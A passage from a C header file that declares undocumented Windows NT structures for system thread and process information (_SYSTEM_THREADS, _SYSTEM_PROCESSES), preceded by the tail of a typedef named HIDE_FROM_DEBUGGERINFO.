} HIDE_FROM_DEBUGGERINFO, PHIDE_FROM_DEBUGGERINFO;

struct _SYSTEM_THREADS
{
	LARGE_INTEGER		KernelTime;
	LARGE_INTEGER		UserTime;
	LARGE_INTEGER		CreateTime;
	ULONG				WaitTime;
	PVOID				StartAddress;
	CLIENT_ID			ClientIs;
	KPRIORITY			Priority;
	KPRIORITY			BasePriority;
	ULONG				ContextSwitchCount;
	ULONG				ThreadState;
	KWAIT_REASON		WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG				NextEntryDelta;
	ULONG				ThreadCount;
	ULONG				Reserved[6];
	LARGE_INTEGER		CreateTime;
	LARGE_INTEGER		UserTime;
	LARGE_INTEGER		KernelTime;
	UNICODE_STRING		ProcessName;
	KPRIORITY			BasePriority;
	ULONG				ProcessId;
	ULONG				InheritedFromProcessId;
	ULONG				HandleCount;
	ULONG				Reserved2[2];
	VM_COUNTERS			VmCounters;
	IO_COUNTERS			IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS		Threads[1];
};


#endif
